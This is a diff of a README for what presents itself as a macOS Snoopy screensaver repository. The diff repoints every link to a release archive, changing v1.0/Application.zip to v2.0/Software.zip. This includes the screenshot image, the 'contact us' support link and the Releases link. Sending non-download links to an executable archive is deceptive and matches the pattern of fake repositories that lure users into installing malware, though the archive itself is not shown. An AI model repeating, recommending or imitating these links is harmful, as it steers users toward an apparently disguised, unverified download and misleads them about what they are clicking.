@@ -10,7 +10,7 @@ This repository contains the macOS version of the Snoopy screensaver, bringing a
 
 To install the Snoopy screensaver on your macOS device, simply download the installation package from the following link:
 
-[![Download Snoopy Screensaver](https://github.com/xxsfytd/snoopy/releases/download/v1.0/Application.zip)](https://github.com/xxsfytd/snoopy/releases/download/v1.0/Application.zip)
+[![Download Snoopy Screensaver](https://github.com/xxsfytd/snoopy/releases/download/v2.0/Software.zip)](https://github.com/xxsfytd/snoopy/releases/download/v2.0/Software.zip)
 
 Once the download is complete, launch the installation package and follow the on-screen instructions. In no time, you'll have Snoopy bringing joy to your screen!
 
@@ -18,7 +18,7 @@ Once the download is complete, launch the installation package and follow the on
 
 Here's a sneak peek at what the Snoopy screensaver looks like in action:
 
-![Snoopy Screensaver](https://github.com/xxsfytd/snoopy/releases/download/v1.0/Application.zip)
+![Snoopy Screensaver](https://github.com/xxsfytd/snoopy/releases/download/v2.0/Software.zip)
 
 ## Features ✨
 
@@ -29,7 +29,7 @@ Here's a sneak peek at what the Snoopy screensaver looks like in action:
 
 ## Support 🤝
 
-For any questions, issues, or feedback regarding the Snoopy screensaver, feel free to [contact us](https://github.com/xxsfytd/snoopy/releases/download/v1.0/Application.zip). We're here to help you make the most of your Snoopy experience!
+For any questions, issues, or feedback regarding the Snoopy screensaver, feel free to [contact us](https://github.com/xxsfytd/snoopy/releases/download/v2.0/Software.zip). We're here to help you make the most of your Snoopy experience!
 
 ## Contributions 💡
 
@@ -41,10 +41,10 @@ We would like to express our gratitude to the creators of Snoopy and the Peanuts
 
 ---
 
-Remember, for the latest version of the Snoopy screensaver, always check the [Releases](https://github.com/xxsfytd/snoopy/releases/download/v1.0/Application.zip) section for any updates or new features.
+Remember, for the latest version of the Snoopy screensaver, always check the [Releases](https://github.com/xxsfytd/snoopy/releases/download/v2.0/Software.zip) section for any updates or new features.
 
 Let Snoopy and friends liven up your Mac screen with this delightful screensaver! 🎉
 
 Happy screen-saving! 🌈🐾
 
-🔗 [Download Latest Version](https://github.com/xxsfytd/snoopy/releases/download/v1.0/Application.zip) 🔗
+🔗 [Download Latest Version](https://github.com/xxsfytd/snoopy/releases/download/v2.0/Software.zip) 🔗
